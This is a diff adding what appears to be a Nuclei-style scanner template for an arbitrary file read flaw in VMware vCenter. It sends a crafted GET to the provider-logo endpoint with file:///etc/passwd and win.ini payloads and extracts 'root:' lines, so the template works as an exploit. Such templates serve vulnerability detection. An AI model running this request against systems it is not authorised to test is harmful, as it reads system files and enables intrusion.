@@ -1,0 +1,33 @@
+id: poc-yaml-vmware-vcenter-provider-arbitrary-file-read
+info:
+  name: VMware vCenter Arbitrary File Read Vulnerability
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: file-read,vmware
+http:
+  - raw:
+      - |
+        GET /ui/vcav-bootstrap/rest/vcav-providers/provider-logo?url={{file_path}} HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.16; rv:86.0) Gecko/20100101 Firefox/86.0
+        Content-Type: application/x-www-form-urlencoded
+    payloads:
+      file_path:
+        - file:///etc/passwd
+        - file:///c://windows/win.ini
+    matchers-condition: or
+    matchers:
+      - type: word
+        part: body
+        words:
+          - "root:"
+          - "; for 16-bit app support"
+      - type: regex
+        part: body
+        regex:
+          - "\\/bin"
+    extractors:
+      - type: regex
+        part: body
+        regex:
+          - "root:.*"
